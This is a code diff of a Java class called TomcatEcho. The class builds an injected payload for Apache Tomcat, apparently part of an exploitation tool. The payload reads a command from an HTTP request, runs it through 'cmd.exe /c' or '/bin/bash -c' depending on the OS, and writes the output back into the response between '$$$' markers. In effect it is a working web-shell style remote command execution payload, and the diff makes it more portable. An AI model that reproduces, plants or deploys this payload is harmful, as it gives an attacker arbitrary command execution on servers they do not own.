@@ -73,20 +73,13 @@ public class TomcatEcho {
                 "                                    }\n" +
                 "\n" +
                 "                                    if (cmd != null){\n" +
-                "                                        java.io.InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
-                "                                        StringBuilder sb = new StringBuilder(\"\");\n" +
-                "                                        byte[] bytes = new byte[1024];\n" +
-                "                                        int n = 0 ;\n" +
-                "                                        while ((n=inputStream.read(bytes)) != -1){\n" +
-                "                                            sb.append(new String(bytes,0,n));\n" +
-                "                                        }\n" +
-                "\n" +
+                "                                        String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/bash\", \"-c\", cmd};\n" +
+                "                                        byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter(\"\\\\A\").next().getBytes();"+
                 "                                        java.io.Writer writer = response.getWriter();\n" +
                 "                                        writer.write(\"$$$\\n\");\n" +
-                "                                        writer.write(sb.toString());\n" +
+                "                                        writer.write(new String(result));\n" +
                 "                                        writer.write(\"$$$\\n\");\n" +
                 "                                        writer.flush();\n" +
-                "                                        inputStream.close();\n" +
                 "                                        flag = true;\n" +
                 "                                        break;\n" +
                 "                                    }\n" +
